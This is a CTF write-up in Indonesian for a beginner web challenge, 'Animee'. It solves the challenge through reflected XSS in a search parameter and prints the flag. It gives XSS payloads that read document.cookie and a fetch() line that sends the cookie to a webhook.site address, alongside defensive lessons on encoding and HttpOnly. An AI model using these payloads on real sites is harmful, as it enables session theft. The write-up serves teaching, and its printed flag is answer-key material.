---
title: "Write-up CTF: Animee – Reflected XSS Cookie Leak"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "CTF, XSS, WebExploit, Cookies"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1769353161970_42eaac9c8c468.png"
createdAt: "2026-01-25T14:59:22.085Z"
updatedAt: "2026-01-25T14:59:22.085Z"
---

# Write-up CTF: Animee – Reflected XSS Cookie Leak

# Write-up CTF: Animee – Reflected XSS Cookie Leak

## Informasi Challenge

**Nama:** Animee  
**Kategori:** Web  
**Tingkat Kesulitan:** Baby  
**Author:** aria  
**Points:** 50  
**Link:** https://aria.my.id/7/anime.php

---

## Deskripsi Challenge

Sebuah website katalog anime dengan fitur pencarian dan tampilan modern. Namun, di balik kemudahan mencari anime favoritmu, ada sesuatu yang tidak beres dengan cara website ini menampilkan hasil pencarian.

**Objektif:**  
Bisakah kamu menemukan celah yang memungkinkanmu mendapatkan cookie session spesial? Temukan cara untuk mengeksekusi JavaScript di browser korban dan dapatkan flag dari cookie!

**Format flag:** `FGTE{}`

**Hint:**  
- XSS  
- 🍪 COOKIE

---

## Analisis

### Reconnaissance

Website ini memiliki fitur pencarian anime dengan parameter URL `?q=`. Ketika melakukan pencarian, input pengguna ditampilkan kembali di halaman hasil pencarian.

**Indikasi vulnerability:**
- Parameter `?q=` menerima input user
- Input ditampilkan langsung di halaman (reflected)
- Kemungkinan **Reflected XSS** jika tidak ada sanitasi yang proper

### Testing XSS

Langkah pertama adalah mencoba payload XSS sederhana untuk melihat apakah JavaScript dapat dieksekusi:

```
?q=<script>alert(1)</script>
```

Jika payload ini berhasil menampilkan alert box, maka website vulnerable terhadap XSS.

### Objective: Cookie Exfiltration

Berdasarkan hint "🍪 COOKIE", target kita adalah mendapatkan cookie yang berisi flag. Cookie tersebut kemungkinan memiliki nama `session` dengan format:

```
session=FGTE{reflected_xss_cookie_leak}
```

---

## Metode Penyelesaian

### Step 1: Identifikasi XSS Vector

Test berbagai payload XSS untuk menemukan vector yang berhasil:

```html
<script>alert(document.cookie)</script>

<svg onload=alert(document.cookie)>
```

### Step 2: Extract Cookie

Setelah menemukan payload yang berhasil, gunakan JavaScript untuk mengakses `document.cookie`:

```javascript
<script>alert(document.cookie)</script>
```

Atau untuk exfiltration yang lebih advanced (jika diperlukan):

```javascript
<script>
fetch('https://webhook.site/YOUR-ID?cookie=' + document.cookie)
</script>
```

### Step 3: Dapatkan Flag

Payload XSS akan mengeksekusi JavaScript dan menampilkan cookie yang berisi flag:

```
session=FGTE{reflected_xss_cookie_leak}
```

---

## Payload

### Final Payload

```
?q=<script>alert(document.cookie)</script>
```

Atau menggunakan alternative payload jika ada filter:

```
?q=
?q=<svg/onload=alert(document.cookie)>
```

---

## Flag

```
FGTE{reflected_xss_cookie_leak}
```

---

## Catatan

### Konsep yang Diuji

Soal ini menguji:

1. **Reflected XSS (Cross-Site Scripting)**
   - Input user yang tidak disanitasi
   - Refleksi input di halaman web
   - Eksekusi JavaScript arbitrary

2. **Cookie Manipulation & Extraction**
   - Akses `document.cookie` via JavaScript
   - Cookie sebagai storage untuk data sensitif
   - Same-origin policy

3. **Web Security Basics**
   - Input validation importance
   - Output encoding
   - XSS prevention techniques

### Kesalahan Umum

Peserta mungkin:
- Mencoba SQL Injection padahal ini XSS challenge ❌
- Tidak memperhatikan hint cookie ❌
- Menggunakan payload yang terlalu kompleks padahal payload sederhana sudah cukup ❌
- Mencoba mencari flag di source code HTML ❌

### Lesson Learned

- Always sanitize and encode user input
- Never trust client-side data
- Cookies dapat diakses via JavaScript jika tidak di-set dengan flag `HttpOnly`
- XSS vulnerability bisa digunakan untuk cookie stealing, session hijacking, dan berbagai serangan lainnya

Challenge ini terlihat sederhana, namun dirancang untuk menguji pemahaman dasar tentang XSS dan cookie manipulation dalam konteks web security.

---

## Referensi

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Cookie Security Best Practices](https://owasp.org/www-community/controls/SecureCookieAttribute)
